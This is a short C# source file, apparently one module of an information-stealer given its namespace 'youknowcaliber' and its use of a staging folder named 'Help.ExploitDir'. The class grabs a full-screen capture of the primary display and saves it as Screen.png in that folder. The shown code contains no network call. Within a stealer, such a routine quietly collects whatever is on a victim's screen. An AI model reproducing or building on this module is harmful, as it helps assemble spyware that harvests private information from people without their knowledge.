using System.Drawing;
using System.Drawing.Imaging;

namespace youknowcaliber
{
    class Screen
    {
        public static void GetScreen()
        {
            string SDir = Help.ExploitDir;
            int width = System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width;
            int height = System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height;
            Bitmap bitmap = new Bitmap(width, height);
            Graphics.FromImage(bitmap).CopyFromScreen(0, 0, 0, 0, bitmap.Size);
            bitmap.Save(SDir + $"\\Screen.png", ImageFormat.Png);
        }
    }
}
